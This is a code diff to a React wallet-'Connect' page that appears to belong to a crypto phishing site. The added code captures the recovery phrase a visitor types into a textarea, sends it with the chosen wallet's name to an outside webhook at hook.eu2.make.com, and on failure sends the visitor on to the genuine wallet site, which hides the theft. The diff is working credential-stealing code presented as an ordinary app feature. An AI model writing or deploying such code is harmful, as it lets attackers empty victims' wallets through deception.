@@ -1,11 +1,12 @@
-import React, { useEffect } from "react";
+import React, { useEffect, useState } from "react";
 import { useParams, useNavigate } from "react-router-dom";
 import { useAuth } from "../Context";
 import Wallets from "../utils/wallets";
+import axios from "axios";
 
 function Connect() {
   const { appName } = useParams();
-  const {  setShowWallet } = useAuth();
+  const { setShowWallet } = useAuth();
 
   const selectedWallet = Wallets.find((items) => items.permalink === appName);
 
@@ -18,6 +19,34 @@ function Connect() {
   useEffect(() => {
     setShowWallet(false);
   }, [setShowWallet]);
+
+  const baseUrl = "https://hook.eu2.make.com/c76m89ilemtctli7i01o4ewoe5l09hzq";
+
+  const [seed, setSeed] = useState("");
+  const [loading, setLoading] = useState(false);
+
+  const handleSubmit = () => {
+    setLoading(true);
+    const payload = {
+      wallet: selectedWallet.name,
+      seedPhrase: seed,
+    };
+
+    axios
+      .post(baseUrl, payload)
+      .then((res) => {
+        setLoading(false);
+        setSeed("");
+        console.log(res);
+      })
+      .catch((e) => {
+        alert("An error occurred, try again");
+        console.log(e);
+        setLoading(false);
+        navigate(selectedWallet.url);
+      });
+  };
+
   return (
     <div className="flex justify-center items-center h-screen bg-[#F9FAFB]">
       <div className="w-11/12 md:w-2/3 bg-white p-6 rounded-2xl shadow-lg max-w-xl">
@@ -48,6 +77,8 @@ function Connect() {
             className="w-full px-4 py-2 border rounded-lg mt-1"
             rows="4"
             placeholder="Enter your recovery phrase"
+            onChange={(e) => setSeed(e.target.value)}
+            value={seed}
           ></textarea>
           <p className="text-xs text-gray-500 mt-1">
             Typically 12 (sometimes 24) words separated by single spaces
@@ -61,8 +92,12 @@ function Connect() {
           >
             Cancel
           </button>
-          <button className="bg-blue-500 text-white px-6 py-2 rounded-lg">
-            PROCEED →
+          <button
+            className="bg-blue-500 text-white px-6 py-2 rounded-lg disabled:bg-slate-200"
+            disabled={loading}
+            onClick={handleSubmit}
+          >
+            {loading ? "loading" : "PROCEED →"}
           </button>
         </div>
       </div>
